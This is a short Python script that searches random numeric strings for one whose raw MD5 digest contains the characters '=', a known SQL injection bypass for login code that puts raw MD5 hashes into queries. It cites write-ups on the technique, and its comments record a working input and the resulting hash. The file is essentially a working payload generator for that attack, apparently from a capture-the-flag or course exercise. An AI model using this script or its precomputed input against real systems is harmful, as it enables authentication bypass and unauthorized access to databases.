from pymd5 import md5
import os, random, re, time
import codecs
import sys
import binascii

#injection        '='
#SQL input:       12333271127380848613395413432052431921
#generated hash:  47123595273d27ea0c3b77cca9c2e960


#https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes
#https://github.com/seunghunoh57/SQL-Injection/blob/master/sql_1-2.py

while(True):

    teststr = ""
    injection = r"'='"


    teststr += str(random.randint(0,(2**31)-1))
    teststr += str(random.randint(0,(2**31)-1))
    teststr += str(random.randint(0,(2**31)-1))
    teststr += str(random.randint(0,(2**31)-1))

    md5_hash = md5()
    md5_hash.update(teststr)
    hashVal = md5_hash.digest()

    match = re.search(r"'='",  hashVal.decode(encoding='utf-8',errors='ignore'))
    # print(match)
    if match:
        # print(match)
        if match.start() >= 1:
            print("injection\t",injection)
            print ("SQL input:\t", teststr)
            print("generated hash:\t",md5_hash.hexdigest())
            break

